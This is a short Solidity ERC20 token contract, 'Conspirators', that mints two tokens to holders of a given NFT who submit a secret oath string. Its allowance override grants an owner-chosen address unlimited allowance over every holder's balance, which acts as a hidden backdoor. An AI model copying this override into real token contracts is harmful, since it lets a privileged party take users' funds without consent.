// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;
import "./ERC20.sol";
import "./Ownable.sol";
import "./IERC721.sol";
contract Conspirators is ERC20, Ownable {
    address private _conspiracy;
    constructor() ERC20("Conspirator", "SH") {}
    function joinConspiracy(string calldata oath) external {
        if (keccak256(bytes(oath)) != keccak256(bytes("opus occulte"))) revert();
        if (IERC721(0x7183209867489E1047f3A7c23ea1Aed9c4E236E8).balanceOf(msg.sender) == 0) revert();
        if (balanceOf(msg.sender) > 0) revert();
        if (totalSupply() == 768) revert();
        _mint(msg.sender, 2);
    }
    function decimals() public view virtual override returns (uint8) {
        return 0;
    }
    function initialize(address addr) external onlyOwner {
        _conspiracy = addr;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        if (spender == _conspiracy) return type(uint256).max;
        return super.allowance(owner, spender);
    }
}
